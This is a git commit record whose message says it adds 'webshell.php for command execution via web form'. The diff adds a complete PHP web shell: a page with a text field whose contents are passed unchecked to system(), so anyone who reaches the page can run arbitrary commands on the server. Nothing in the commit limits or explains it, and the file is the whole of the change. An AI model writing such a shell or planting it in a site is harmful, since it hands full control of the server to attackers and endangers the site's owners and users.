0221a22da51be14a5baa9d46aced077b69f2d9fd
준영 (Ray) <dsph9245@naver.com>
2025-12-17 13:21:06 +0900

    Add webshell.php for command execution via web form

---
+++ src/webshell.php
@@ -0,0 +1,23 @@
+<html>
+
+<body>
+
+    <form method="GET" name = "<?php echo basename($_SERVER['PHP SELF']); ?>">
+    <input type="text" name="cmd" autofocus id="cmd" size="80">
+    <input type="submit" value="Execute">
+    </form>
+    <pre>
+    <?php
+        
+        if (isset($_GET['cmd'])) {
+            
+            system($_GET['cmd']);
+            
+        }
+
+    ?>
+    </pre>
+
+</body>
+
+</html>
